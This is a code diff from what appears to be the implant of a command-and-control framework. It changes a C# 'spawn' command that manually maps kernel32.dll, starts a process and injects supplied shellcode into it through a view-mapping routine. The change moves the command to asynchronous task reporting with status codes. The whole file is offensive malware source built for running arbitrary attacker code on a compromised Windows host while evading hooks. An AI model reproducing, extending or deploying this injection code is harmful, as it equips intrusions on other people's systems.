@@ -1,5 +1,6 @@
 ﻿using Engineer.Commands;
 using Engineer.Extra;
+using Engineer.Functions;
 using Engineer.Models;
 using System;
 using System.Collections.Generic;
@@ -16,7 +17,7 @@ namespace Engineer.Commands
     {
         public override string Name => "spawn";
         private static h_reprobate.PE.PE_MANUAL_MAP ker32 = reprobate.MapModuleToMemory(@"C:\Windows\System32\kernel32.dll");
-        public override string Execute(EngineerTask task)
+        public override async Task Execute(EngineerTask task)
         {
             //get some variuables ready for spawning process
             var si = new WinAPIs.Kernel32.STARTUPINFO();
@@ -29,7 +30,8 @@ namespace Engineer.Commands
 
             if(task.File.Length < 1)
             {
-                return "error: " + "No shellcode provided";
+                Tasking.FillTaskResults("error: " + "No shellcode provided", task, EngTaskStatus.FailedWithWarnings);
+                return;
             }
             //convert from base64 string to byte array
             byte[] shellcode = task.File;
@@ -43,9 +45,9 @@ namespace Engineer.Commands
 
             if (MapViewLoadShellcode(shellcode, pi.hProcess, pi.hThread))
             {
-                return "Shellcode Spawned";
+                Tasking.FillTaskResults("Shellcode Spawned", task, EngTaskStatus.Complete);
             }
-            return "error: " + "Failed to Spawn Shellcode";
+            Tasking.FillTaskResults("error: " + "Failed to Spawn Shellcode", task, EngTaskStatus.Failed);
 
         }
         public static bool MapViewLoadShellcode(byte[] shellcode, IntPtr hProcess, IntPtr hThread)
